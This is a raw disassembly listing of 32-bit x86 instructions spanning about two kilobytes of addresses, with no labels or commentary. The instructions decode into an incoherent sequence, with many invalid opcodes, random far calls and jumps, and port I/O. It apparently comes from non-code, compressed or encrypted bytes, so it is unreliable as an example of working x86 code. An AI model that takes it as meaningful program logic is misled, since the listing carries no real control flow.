  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x48]
  40cbfc:	test   DWORD PTR [edx+0x3a],esp
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cb89
  40cc08:	xchg   DWORD PTR [edx+esi*1-0x4e],ebx
  40cc0c:	dec    esi
  40cc0d:	add    al,0x43
  40cc0f:	cmp    eax,DWORD PTR [esi-0x11138e3c]
  40cc15:	inc    ecx
  40cc16:	ds enter 0xe077,0x12
  40cc1b:	mov    ah,0x44
  40cc1d:	inc    edi
  40cc1e:	retf   
  40cc1f:	push   es
  40cc20:	in     eax,0x45
  40cc22:	inc    eax
  40cc23:	push   ebx
  40cc24:	inc    ebx
  40cc25:	or     BYTE PTR [edx+0x3fb9736c],dl
  40cc2b:	int3   
  40cc2c:	sbb    BYTE PTR [ebx-0x5e6116ff],ch
  40cc32:	in     al,dx
  40cc33:	sub    eax,0x572b6a9e
  40cc38:	fimul  WORD PTR [ebx]
  40cc3a:	sbb    eax,0xc3332e93
  40cc3f:	mov    ecx,DWORD PTR [esi]
  40cc41:	xor    DWORD PTR [ecx+0x4f3df828],ebx
  40cc47:	aad    0xc6
  40cc49:	jno    0x40cc05
  40cc4b:	in     al,dx
  40cc4c:	push   ecx
  40cc4d:	pushf  
  40cc4e:	nop
  40cc4f:	es jge 0x40cbf2
  40cc52:	xchg   ebp,eax
  40cc53:	sar    BYTE PTR [eax-0x4904c1a1],cl
  40cc59:	scas   al,BYTE PTR es:[edi]
  40cc5a:	jmp    0x40ccc3
  40cc5c:	push   esi
  40cc5d:	or     al,0x1d
  40cc5f:	adc    eax,esp
  40cc61:	sub    eax,edi
  40cc63:	cmp    eax,0x6872093
  40cc68:	ret    
  40cc69:	in     al,dx
  40cc6a:	sub    DWORD PTR [ebp-0x2336a815],eax
  40cc70:	xor    eax,0x2b0ed3c5
  40cc75:	dec    edx
  40cc76:	dec    ebp
  40cc77:	jl     0x40cccc
  40cc79:	sbb    al,0x68
  40cc7b:	jle    0x40cc66
  40cc7d:	test   eax,0xb30a86ac
  40cc82:	cmp    eax,0x955f0fd2
  40cc87:	jge    0x40cc5a
  40cc89:	scas   eax,DWORD PTR es:[edi]
  40cc8a:	xlat   BYTE PTR ds:[ebx]
  40cc8b:	cdq    
  40cc8c:	inc    eax
  40cc8d:	ret    
  40cc8e:	sahf   
  40cc8f:	lds    edi,FWORD PTR [ebx+0x1357b7e7]
  40cc95:	adc    cl,BYTE PTR [eax+0x5c]
  40cc98:	pop    edi
  40cc99:	add    DWORD PTR [esi],edx
  40cc9b:	push   ss
  40cc9c:	jno    0x40cd19
  40cc9e:	cwde   
  40cc9f:	lods   al,BYTE PTR ds:[esi]
  40cca0:	pusha  
  40cca1:	sub    al,0x9
  40cca3:	xor    DWORD PTR [esp+eiz*2+0x75],edi
  40cca7:	xor    edi,DWORD PTR [ebp+0x61fbe572]
  40ccad:	jmp    0x40cc82
  40ccaf:	mov    eax,0x364163d3
  40ccb4:	mov    edx,DWORD PTR [edi]
  40ccb6:	int3   
  40ccb7:	pop    ss
  40ccb8:	arpl   WORD PTR [edi-0x2e],di
  40ccbb:	sub    esp,DWORD PTR [ecx-0x662c7223]
  40ccc1:	sbb    al,al
  40ccc3:	xchg   BYTE PTR [edx+0x33],al
  40ccc6:	jmp    0x98f49996
  40cccb:	add    eax,0x6b4bb588
  40ccd0:	popa   
  40ccd1:	mov    esi,0xb9788ee0
  40ccd6:	stos   BYTE PTR es:[edi],al
  40ccd7:	pop    esp
  40ccd8:	inc    esi
  40ccd9:	rcl    BYTE PTR [esp+eax*2+0x69ccec1e],1
  40cce0:	call   DWORD PTR [eax-0x2b01a5a3]
  40cce6:	jmp    0x40ccec
  40cce8:	sub    esi,DWORD PTR [ecx+0x65d82053]
  40ccee:	es inc ecx
  40ccf0:	popf   
  40ccf1:	mov    al,0x93
  40ccf3:	or     ebx,DWORD PTR [eax+0x21]
  40ccf6:	ret    0xf773
  40ccf9:	nop
  40ccfa:	test   dh,dl
  40ccfc:	(bad)  
  40ccfd:	mov    esi,0xc1961ae
  40cd02:	jl     0x40ccbf
  40cd04:	pop    edi
  40cd05:	les    edi,FWORD PTR [ecx+0xd13bb72]
  40cd0b:	cmp    al,0xb7
  40cd0d:	nop
  40cd0e:	mov    al,0xcc
  40cd10:	retf   
  40cd11:	ins    BYTE PTR es:[edi],dx
  40cd12:	retf   0x5557
  40cd15:	and    BYTE PTR [ecx],ch
  40cd17:	push   ecx
  40cd18:	sub    al,0x98
  40cd1a:	fcomp  DWORD PTR gs:[eax+edx*1]
  40cd1e:	or     DWORD PTR [ebp+0x68],eax
  40cd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd22:	xor    BYTE PTR [edx],0x2e
  40cd25:	pop    esi
  40cd26:	ins    BYTE PTR es:[edi],dx
  40cd27:	imul   eax,ebx,0x2fbce7b0
  40cd2d:	fild   QWORD PTR [edx-0x47]
  40cd30:	push   edx
  40cd31:	cmp    al,BYTE PTR [ebx-0xc]
  40cd34:	gs arpl ax,di
  40cd37:	or     DWORD PTR [ecx+0x5b8b73e4],esi
  40cd3d:	es xchg ebx,eax
  40cd3f:	lahf   
  40cd40:	push   edx
  40cd41:	sbb    BYTE PTR [ebp+0x503eb092],al
  40cd47:	mov    ecx,0x6397e873
  40cd4c:	mov    al,ds:0xa7226517
  40cd51:	pop    edi
  40cd52:	pop    ss
  40cd53:	fiadd  DWORD PTR [esp+ebx*1]
  40cd56:	jne    0x40cda2
  40cd58:	mov    dh,0x5b
  40cd5a:	cdq    
  40cd5b:	inc    ebp
  40cd5c:	xor    ebp,DWORD PTR [eax-0xe]
  40cd5f:	popf   
  40cd60:	add    DWORD PTR [esi],ebp
  40cd62:	stos   BYTE PTR es:[edi],al
  40cd63:	ds ja  0x40cd3a
  40cd66:	dec    ebp
  40cd67:	mov    esi,0xcfe3fc51
  40cd6c:	mov    ds:0x2f8a40b9,al
  40cd71:	(bad)  [ebp+0x16483fce]
  40cd77:	jb     0x40cdd0
  40cd79:	and    eax,0x1e7d5895
  40cd7e:	adc    BYTE PTR [ebp-0x1],dh
  40cd81:	shl    ch,1
  40cd83:	sub    DWORD PTR [ebp+0x55],0x45
  40cd87:	dec    edi
  40cd88:	outs   dx,BYTE PTR ds:[esi]
  40cd89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd8a:	sub    ecx,DWORD PTR [eax+0x59d99d46]
  40cd90:	cdq    
  40cd91:	fmul   DWORD PTR [ecx-0x44309d34]
  40cd97:	lock ffree st(7)
  40cd9a:	add    DWORD PTR [eax],0x7643e555
  40cda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cda1:	ss jne 0x40cd5e
  40cda4:	sub    eax,0x75999c88
  40cda9:	out    0x23,al
  40cdab:	je     0x40cd5a
  40cdad:	fs in  eax,0xc
  40cdb0:	pop    ecx
  40cdb1:	mov    ebp,0xcd236afe
  40cdb6:	mov    BYTE PTR [ebp-0x1bd84aba],dh
  40cdbc:	mov    es,WORD PTR [ecx]
  40cdbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdbf:	rol    BYTE PTR [edi],0xba
  40cdc2:	cwde   
  40cdc3:	sbb    al,0xde
  40cdc5:	cs mov esi,0x5f3457cd
  40cdcb:	jp     0x40cdbe
  40cdcd:	mov    eax,ds:0xc39e9121
  40cdd2:	lock push esp
  40cdd4:	and    eax,ecx
  40cdd6:	popa   
  40cdd7:	std    
  40cdd8:	cmp    DWORD PTR [eax+ebp*2-0x21],edx
  40cddc:	inc    eax
  40cddd:	daa    
  40cdde:	in     eax,dx
  40cddf:	fidiv  DWORD PTR [esi]
  40cde1:	and    DWORD PTR [ebx+ebx*8],ebp
  40cde4:	ins    DWORD PTR es:[edi],dx
  40cde5:	loopne 0x40cd96
  40cde7:	sbb    al,0x91
  40cde9:	sub    BYTE PTR [edi],bl
  40cdeb:	jne    0x40ce0e
  40cded:	outs   dx,BYTE PTR ds:[esi]
  40cdee:	sbb    DWORD PTR [eax],ebp
  40cdf0:	mov    ds:0x483629fa,al
  40cdf5:	and    ah,BYTE PTR [eax-0x12]
  40cdf8:	fsub   st(0),st
  40cdfa:	xchg   dh,bl
  40cdfc:	lods   eax,DWORD PTR ds:[esi]
  40cdfd:	out    0x2f,al
  40cdff:	(bad)  
  40ce00:	cmp    DWORD PTR [edx*2-0x1a6f3dba],eax
  40ce07:	dec    ebx
  40ce08:	jecxz  0x40ce04
  40ce0a:	xchg   DWORD PTR [esi],esp
  40ce0c:	test   eax,0x1351bae9
  40ce11:	sbb    BYTE PTR [ecx],bl
  40ce13:	call   0x7c8a:0x90eb356b
  40ce1a:	lock call 0xd3de:0xa6d32279
  40ce22:	inc    eax
  40ce23:	xor    DWORD PTR [ebx-0x5bc7db37],esi
  40ce29:	dec    ebp
  40ce2a:	adc    BYTE PTR [eax],bh
  40ce2c:	test   BYTE PTR [edi-0x6f],0x40
  40ce30:	mov    edx,0x15a2a00c
  40ce35:	int    0xcc
  40ce37:	fs ins DWORD PTR es:[edi],dx
  40ce39:	mov    edx,0xb4454b86
  40ce3e:	leave  
  40ce3f:	(bad)  
  40ce40:	les    ebp,FWORD PTR [edx+0x11386cb2]
  40ce46:	xchg   edx,eax
  40ce47:	sbb    DWORD PTR [esi],0x3cf42839
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	div    BYTE PTR [esi]
  40ce64:	out    0x2f,eax
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	jmp    0x9801bf46
  40ce73:	call   0xf2e13d14
  40ce78:	or     eax,0xa7e5002e
  40ce7d:	sbb    dl,BYTE PTR [ebx]
  40ce7f:	pop    ds
  40ce80:	lods   eax,DWORD PTR ds:[esi]
  40ce81:	mov    eax,ds:0xbf5538f3
  40ce86:	adc    al,0x77
  40ce88:	cmp    al,0xdd
  40ce8a:	inc    ebp
  40ce8b:	rcr    DWORD PTR [ebp+0x1695259b],1
  40ce91:	pop    ebx
  40ce92:	int    0x1c
  40ce94:	add    ah,BYTE PTR [ecx+edi*8-0x368b5302]
  40ce9b:	xor    DWORD PTR [ebp+0x13],ebx
  40ce9e:	test   BYTE PTR [eax+0x5343095a],bh
  40cea4:	push   esp
  40cea5:	mov    ds:0xab93c14f,eax
  40ceaa:	(bad)  
  40ceab:	fldcw  WORD PTR [esi-0xd]
  40ceae:	dec    ebp
  40ceaf:	les    esp,FWORD PTR [eax]
  40ceb1:	mov    ch,0x78
  40ceb4:	mov    edx,0x92d57531
  40ceb9:	(bad)
  40cebc:	add    bl,BYTE PTR [edx-0x43dd0589]
  40cec2:	arpl   WORD PTR [eax+0x77],ax
  40cec5:	inc    ecx
  40cec6:	adc    eax,0xbf5851e5
  40cecb:	popa   
  40cecc:	arpl   WORD PTR [edx+edx*2+0x24bec791],bp
  40ced3:	ret    0xfe64
  40ced6:	inc    eax
  40ced7:	adc    DWORD PTR [esi+eax*4-0x2f],esp
  40cedb:	sbb    eax,0x4f164f9
  40cee0:	rol    esp,0x44
  40cee3:	cmp    edi,0xffffffb7
  40cee6:	jle    0x40ce82
  40cee8:	adc    esi,esi
  40ceea:	ss test al,0xa3
  40ceed:	mov    esi,0xbdb7e2c3
  40cef2:	push   es
  40cef3:	scas   al,BYTE PTR es:[edi]
  40cef4:	xchg   ebp,eax
  40cef5:	popa   
  40cef6:	stc    
  40cef7:	in     eax,dx
  40cef8:	jle    0x40cea1
  40cefa:	cdq    
  40cefb:	jae    0x40cef7
  40cefd:	in     eax,0xd9
  40ceff:	jl     0x40ced6
  40cf01:	jg     0x40cf30
  40cf03:	sub    BYTE PTR [ebx],0x19
  40cf06:	loope  0x40cee0
  40cf08:	pusha  
  40cf09:	jns    0x40cf35
  40cf0b:	pop    edi
  40cf0c:	mov    esi,0x70ba8297
  40cf11:	inc    ebp
  40cf12:	sub    al,0x6f
  40cf14:	jl     0x40cf3e
  40cf16:	cmp    esp,eax
  40cf18:	fwait
  40cf19:	pusha  
  40cf1a:	aas    
  40cf1b:	cwde   
  40cf1c:	cmp    DWORD PTR [edx+0x32c8836],0xffffffe4
  40cf23:	inc    ebx
  40cf24:	mov    ah,0xe9
  40cf26:	adc    BYTE PTR [edx],ch
  40cf28:	sbb    eax,0x75b8c2db
  40cf2d:	mov    edi,0x1d903de
  40cf32:	jp     0x40cfa3
  40cf34:	xor    DWORD PTR [ecx-0x25],edi
  40cf37:	mov    ds:0xb38c4737,eax
  40cf3c:	mov    ecx,0x943a9478
  40cf41:	out    0xa6,al
  40cf43:	xlat   BYTE PTR ds:[ebx]
  40cf44:	fsub   DWORD PTR [edx+0x7069573b]
  40cf4a:	bnd je 0x40cf52
  40cf4d:	push   esi
  40cf4e:	daa    
  40cf4f:	fsqrt  
  40cf51:	and    ch,ah
  40cf53:	out    dx,al
  40cf54:	in     eax,dx
  40cf55:	js     0x40cfba
  40cf57:	out    dx,eax
  40cf58:	push   ecx
  40cf59:	inc    esp
  40cf5a:	jl     0x40cf26
  40cf5c:	std    
  40cf5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf5e:	inc    esi
  40cf5f:	cmp    cl,BYTE PTR [edi-0x2c2ae281]
  40cf65:	repnz sbb ebp,DWORD PTR ds:[eax+0x106080b]
  40cf6d:	test   BYTE PTR [edx-0x60174fa7],ch
  40cf73:	retf   
  40cf74:	std    
  40cf75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf76:	in     al,dx
  40cf77:	call   0x4a70:0xf8015e52
  40cf7e:	cmp    ecx,0x15b636e
  40cf84:	sub    BYTE PTR [edx+edi*2],dl
  40cf87:	out    0x2a,eax
  40cf89:	test   al,0xfb
  40cf8b:	inc    edx
  40cf8c:	fdivr  st,st(4)
  40cf8e:	fsub   DWORD PTR [ecx+0x6e269e9e]
  40cf94:	mov    bl,0xa8
  40cf96:	jmp    0x40cff0
  40cf98:	and    eax,0xbc359132
  40cf9d:	aas    
  40cf9e:	sbb    ebx,ebx
  40cfa0:	cli    
  40cfa1:	push   edx
  40cfa2:	fst    DWORD PTR [ecx]
  40cfa4:	push   cs
  40cfa5:	aad    0x48
  40cfa7:	les    edi,FWORD PTR [ecx-0x23036065]
  40cfad:	pcmpeqb mm2,QWORD PTR [edx+0x2e198e2a]
  40cfb4:	sub    edi,DWORD PTR [esi-0x183f22f]
  40cfba:	push   0x7196cf0
  40cfbf:	idiv   edi
  40cfc1:	pop    es
  40cfc2:	cmc    
  40cfc3:	aaa    
  40cfc4:	stc    
  40cfc5:	cmp    bh,ah
  40cfc7:	scas   eax,DWORD PTR es:[edi]
  40cfc8:	xor    BYTE PTR [ecx+0x6b],bl
  40cfcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfcc:	mov    ecx,0xd7d3c0d5
  40cfd1:	fcmovnu st,st(6)
  40cfd3:	jmp    0x47d54a95
  40cfd8:	pop    ecx
  40cfd9:	lods   al,BYTE PTR ds:[esi]
  40cfda:	fwait
  40cfdb:	pop    edx
  40cfdc:	loop   0x40d00f
  40cfde:	lahf   
  40cfdf:	cli    
  40cfe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe1:	add    esi,ecx
  40cfe3:	mov    esi,0x8e1a8e3
  40cfe8:	rol    DWORD PTR [ebx-0x23],cl
  40cfeb:	dec    ecx
  40cfec:	shl    DWORD PTR [esi+0x16],1
  40cfef:	inc    eax
  40cff0:	jg     0x40cfa1
  40cff2:	inc    edx
  40cff3:	push   esi
  40cff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cff5:	rcr    eax,1
  40cff7:	mov    eax,0xe143c81d
  40cffc:	dec    edi
  40cffd:	mov    WORD PTR [esi-0x39],?
  40d000:	aas    
  40d001:	pushf  
  40d002:	ret    
  40d003:	xor    edi,ecx
  40d005:	call   0xd5c0:0x6f466084
  40d00c:	aas    
  40d00d:	stos   DWORD PTR es:[edi],eax
  40d00e:	pushf  
  40d00f:	or     BYTE PTR [eax-0x763aa319],ch
  40d015:	(bad)  
  40d016:	sub    dh,BYTE PTR [edx+eiz*2-0x3c3541eb]
  40d01d:	outs   dx,DWORD PTR ds:[esi]
  40d01e:	gs int 0xce
  40d021:	jmp    0x40d081
  40d023:	adc    BYTE PTR [eax-0x2a],dl
  40d026:	mov    bl,BYTE PTR ds:0x95d34c4e
  40d02c:	daa    
  40d02d:	or     dl,al
  40d02f:	cwde   
  40d030:	mov    ss,WORD PTR [esi-0x38e27087]
  40d036:	in     eax,dx
  40d037:	push   edx
  40d038:	pushf  
  40d039:	les    ebx,FWORD PTR [eax-0x64]
  40d03c:	cmp    al,0xf5
  40d03e:	xchg   esi,eax
  40d03f:	test   BYTE PTR cs:[eax-0x1e],ch
  40d043:	aam    0xea
  40d045:	sub    ebx,DWORD PTR [edx]
  40d047:	mov    ch,0x4d
  40d049:	mov    WORD PTR [eax],?
  40d04b:	test   BYTE PTR [ecx+esi*4-0x42],dl
  40d04f:	adc    DWORD PTR [eax],0xffffffe3
  40d052:	cli    
  40d053:	inc    ebx
  40d054:	repnz dec esp
  40d056:	(bad)  
  40d057:	sub    bh,BYTE PTR [edx-0x34]
  40d05a:	fld    DWORD PTR [eax-0x336f7d4b]
  40d060:	outs   dx,BYTE PTR ds:[esi]
  40d061:	push   ecx
  40d062:	or     eax,0xb41c7035
  40d067:	scas   eax,DWORD PTR es:[edi]
  40d068:	mov    dh,0x6d
  40d06a:	mov    ds:0x4f20abf2,al
  40d06f:	push   ecx
  40d070:	cmp    eax,0x2d538463
  40d075:	ds fwait
  40d077:	(bad)  
  40d078:	mov    esp,0x768536ba
  40d07d:	lds    edi,FWORD PTR [esi-0x2]
  40d080:	mov    DWORD PTR ss:[esi+0x7e8c6ac6],ebx
  40d087:	movups xmm3,xmm7
  40d08a:	xchg   DWORD PTR [edx+0x11],edi
  40d08d:	stos   BYTE PTR es:[edi],al
  40d08e:	adc    eax,edi
  40d090:	mov    eax,ds:0x4c39386d
  40d095:	mov    eax,0xc7fef8cf
  40d09a:	(bad)  
  40d09b:	sbb    eax,DWORD PTR [edi-0x4a881a62]
  40d0a1:	push   eax
  40d0a2:	mov    ds:0xd5e24405,eax
  40d0a7:	dec    eax
  40d0a8:	inc    bp
  40d0aa:	dec    edx
  40d0ab:	(bad)  
  40d0ac:	es stc 
  40d0ae:	jns    0x40d0f1
  40d0b0:	mov    ah,0xaf
  40d0b2:	or     ch,BYTE PTR [edx-0x1bba74b7]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	jae    0x40d09c
  40d0d1:	xchg   BYTE PTR [edx+0x7e7e89f6],dh
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0dc:	or     BYTE PTR [edi+0xe41db7],al
  40d0e2:	ss xchg ebp,eax
  40d0e4:	pop    ds
  40d0e5:	data16 test al,0xc2
  40d0e8:	jb     0x40d15e
  40d0ea:	push   ebp
  40d0eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0ec:	popf   
  40d0ed:	mov    esi,0x8cacf0e3
  40d0f2:	and    bl,dh
  40d0f4:	pop    edi
  40d0f5:	xchg   esp,eax
  40d0f6:	(bad)  
  40d0f7:	sub    al,0x5e
  40d0f9:	fidivr DWORD PTR [esi+esi*2+0x26]
  40d0fd:	(bad)  
  40d0fe:	in     al,dx
  40d0ff:	cmp    al,0x9b
  40d101:	sbb    eax,DWORD PTR [ecx]
  40d103:	jae    0x40d0fa
  40d105:	addr16 cmp al,0xc2
  40d108:	mov    ecx,0x8f69e6fd
  40d10d:	mov    edi,0xf2d7de41
  40d112:	cmp    edi,DWORD PTR [esi-0x4cc53b9e]
  40d118:	sbb    edx,DWORD PTR ds:0x422f17c5
  40d11e:	outs   dx,DWORD PTR ds:[esi]
  40d11f:	out    dx,al
  40d120:	(bad)  
  40d121:	mov    al,ds:0xffe178a8
  40d126:	cs cmp eax,0xe989fb72
  40d12c:	inc    esp
  40d12d:	int3   
  40d12e:	ficomp WORD PTR [ebp-0x6e]
  40d131:	adc    eax,0xb7471f97
  40d136:	cmp    edx,ebx
  40d138:	adc    bh,dh
  40d13a:	maskmovq mm4,mm7
  40d13d:	push   edi
  40d13e:	jg     0x40d188
  40d140:	mov    bh,BYTE PTR [ecx+0x79]
  40d143:	xchg   ebp,eax
  40d144:	jecxz  0x40d0ce
  40d146:	sub    al,cl
  40d148:	enter  0x96b4,0xcf
  40d14c:	mov    al,0x75
  40d14e:	pop    ebx
  40d14f:	aaa    
  40d150:	jg     0x40d158
  40d152:	popa   
  40d153:	(bad)  
  40d154:	or     esp,esi
  40d156:	int    0x5f
  40d158:	aas    
  40d159:	mov    ch,BYTE PTR [esi]
  40d15b:	out    0x5a,eax
  40d15d:	popf   
  40d15e:	out    0x1c,eax
  40d160:	pop    esi
  40d161:	pop    ebx
  40d162:	jb     0x40d10a
  40d164:	test   DWORD PTR [esi+0x4438675a],0xbea19e4b
  40d16e:	fbstp  TBYTE PTR [edx+eax*8]
  40d171:	inc    edi
  40d172:	out    dx,al
  40d173:	mov    ebp,0x51318f22
  40d178:	adc    BYTE PTR [ebx+edi*1],0xe
  40d17c:	lahf   
  40d17d:	scas   eax,DWORD PTR es:[edi]
  40d17e:	inc    esi
  40d17f:	cmp    al,0x7d
  40d181:	cs sbb al,0x8f
  40d184:	push   ecx
  40d185:	aaa    
  40d186:	push   0x55
  40d188:	lea    ebx,[edx]
  40d18a:	xchg   ecx,eax
  40d18b:	fs cmp eax,0x10b43d24
  40d191:	into   
  40d192:	or     DWORD PTR [edx+0x2ee0b927],esp
  40d198:	mov    bh,BYTE PTR [ecx+0x2a16abb]
  40d19e:	pop    ebp
  40d19f:	jae    0x40d135
  40d1a1:	mov    cl,0xbd
  40d1a3:	repz add esp,ebp
  40d1a6:	mov    edi,0x348d8052
  40d1ab:	clc    
  40d1ac:	mov    edx,0x7c02c741
  40d1b1:	loope  0x40d222
  40d1b3:	pusha  
  40d1b4:	mov    al,ds:0xe8a8d336
  40d1b9:	sub    al,0xa2
  40d1bb:	pushf  
  40d1bc:	cmc    
  40d1bd:	push   eax
  40d1be:	xchg   edi,eax
  40d1bf:	daa    
  40d1c0:	jns    0x40d20b
  40d1c2:	fisubr DWORD PTR [ebp-0x11c4bda8]
  40d1c8:	shr    DWORD PTR [eax+0x729b92f4],0x9b
  40d1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1d0:	das    
  40d1d1:	sub    ah,BYTE PTR ds:0x61c523c4
  40d1d7:	xor    BYTE PTR [ecx+esi*4],cl
  40d1da:	lods   ax,WORD PTR ds:[esi]
  40d1dc:	inc    ebp
  40d1dd:	cmp    bh,bl
  40d1df:	iret   
  40d1e0:	push   0x67
  40d1e2:	jne    0x40d208
  40d1e4:	sti    
  40d1e5:	call   0x20f1:0x35f8ec08
  40d1ec:	sub    esp,DWORD PTR [ebp+eiz*4-0x1]
  40d1f0:	test   bl,bl
  40d1f2:	inc    edx
  40d1f3:	and    eax,0xef29ec41
  40d1f8:	sbb    BYTE PTR [esi+ebx*2+0x25242a2],dh
  40d1ff:	add    bh,BYTE PTR [eax+ecx*2]
  40d202:	push   0x6d66bd86
  40d207:	mov    ?,ecx
  40d209:	sbb    DWORD PTR [edi],ebp
  40d20b:	jp     0x40d1b2
  40d20d:	into   
  40d20e:	mov    ah,0xac
  40d210:	jp     0x40d250
  40d212:	retf   0xce73
  40d215:	pop    edi
  40d216:	inc    eax
  40d217:	inc    ebp
  40d218:	jo     0x40d234
  40d21a:	bndstx [ebp-0x1068bdcc],bnd1
  40d221:	mov    al,ds:0x1d1cf74b
  40d226:	out    dx,al
  40d227:	retf   0x78cb
  40d22a:	outs   dx,DWORD PTR ds:[esi]
  40d22b:	jge    0x40d20e
  40d22d:	dec    esi
  40d22e:	cmc    
  40d22f:	sub    DWORD PTR [edx+0x6b8f1e28],ecx
  40d235:	in     eax,dx
  40d236:	mov    ecx,0xa5c8d804
  40d23b:	call   0x2479857e
  40d240:	or     ah,ah
  40d242:	and    DWORD PTR [ecx+0x37c3637a],esp
  40d248:	jge    0x40d219
  40d24a:	adc    ebp,DWORD PTR [ecx+0x612f9511]
  40d250:	jg     0x40d27a
  40d252:	mov    edx,?
  40d254:	retf   0xb809
  40d257:	and    BYTE PTR [ecx-0x45],cl
  40d25a:	and    BYTE PTR [esi],ah
  40d25c:	sbb    al,BYTE PTR [ebp-0x46]
  40d25f:	jp     0x40d25c
  40d261:	(bad)  
  40d262:	jmp    0x40d2a9
  40d264:	xor    DWORD PTR [ecx-0x78d53949],0x483b48ad
  40d26e:	jb     0x40d25c
  40d270:	jne    0x40d21f
  40d272:	outs   dx,BYTE PTR ds:[esi]
  40d273:	mov    edx,0x1be60589
  40d278:	cmc    
  40d279:	add    DWORD PTR [esi+esi*1],0x8ae17f5c
  40d280:	fld    QWORD PTR [edx+eiz*8+0x56]
  40d284:	popf   
  40d285:	mov    ecx,0xc88d0412
  40d28a:	adc    al,0xf6
  40d28c:	es loope 0x40d2ee
  40d28f:	and    dh,BYTE PTR [ebp-0x70]
  40d292:	sar    DWORD PTR [esi-0x60],1
  40d295:	sbb    dh,BYTE PTR [esi+0x47]
  40d298:	lds    esp,FWORD PTR [ebx-0x55]
  40d29b:	or     eax,DWORD PTR [ecx+ebx*8+0x2e]
  40d29f:	mov    ds:0xfaec1045,eax
  40d2a4:	inc    edi
  40d2a5:	fldcw  WORD PTR [ebp+0x358498b4]
  40d2ab:	rcl    dl,1
  40d2ad:	inc    edx
  40d2ae:	xchg   esi,eax
  40d2af:	inc    ebp
  40d2b0:	iret   
  40d2b1:	imul   DWORD PTR [esi+0x1162a136]
  40d2b7:	mov    eax,0xf06ef8e9
  40d2bc:	iret   
  40d2bd:	adc    eax,0x6c2227f8
  40d2c2:	and    DWORD PTR [esi+0x18b085a2],esi
  40d2c8:	sub    ebx,DWORD PTR [ecx-0x58]
  40d2cb:	ins    DWORD PTR es:[edi],dx
  40d2cc:	jecxz  0x40d253
  40d2ce:	sbb    DWORD PTR [edx+ebp*4],esp
  40d2d1:	add    DWORD PTR [ebx+0x4c],eax
  40d2d4:	daa    
  40d2d5:	lea    eax,[esi]
  40d2d7:	ficomp DWORD PTR [edx+0xa11cae4]
  40d2dd:	push   esi
  40d2de:	jg     0x40d288
  40d2e0:	add    al,bh
  40d2e2:	sub    eax,0x7ae0ae03
  40d2e7:	jmp    DWORD PTR [eax-0x79]
  40d2ea:	int3   
  40d2eb:	shl    BYTE PTR [edi+0x7a945579],0x1b
  40d2f2:	scas   eax,DWORD PTR es:[edi]
  40d2f3:	shr    DWORD PTR [ecx+0x50],0x45
  40d2f7:	mov    ch,BYTE PTR [esi-0x7d]
  40d2fa:	mov    edi,0x554292a8
  40d2ff:	and    esi,DWORD PTR [ecx]
  40d301:	and    bl,0xf0
  40d304:	cmp    DWORD PTR [ebp+0x5],edi
  40d307:	cld    
  40d308:	ror    DWORD PTR [ebx-0x3fd8b644],cl
  40d30e:	fldcw  WORD PTR [edx-0x7b]
  40d312:	cmp    bh,0xc1
  40d315:	dec    esp
  40d316:	in     eax,dx
  40d317:	sub    ebx,DWORD PTR [edi-0x6d]
  40d31a:	add    al,0x5d
  40d31c:	test   al,0x8b
  40d31e:	and    BYTE PTR [esi+0x71],ah
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	call   0xb08ac987
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	dec    ebp
  40d345:	aaa    
  40d346:	shr    DWORD PTR [edx],0xda
  40d349:	inc    edi
  40d34a:	cwde   
  40d34b:	arpl   di,sp
  40d34d:	push   eax
  40d34e:	ret    
  40d34f:	xor    BYTE PTR [eax],al
  40d351:	neg    BYTE PTR [esi]
  40d353:	or     dl,BYTE PTR [esi-0x4431f97]
  40d359:	outs   dx,BYTE PTR ds:[esi]
  40d35a:	shr    ch,0xa2
  40d35d:	adc    bl,ah
  40d35f:	aas    
  40d360:	rcr    DWORD PTR ds:0xb9c4cd45,1
  40d366:	jl     0x40d2f0
  40d368:	dec    edi
  40d369:	or     ebx,esp
  40d36b:	pushf  
  40d36c:	pushf  
  40d36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d36e:	inc    ecx
  40d36f:	es lock inc esi
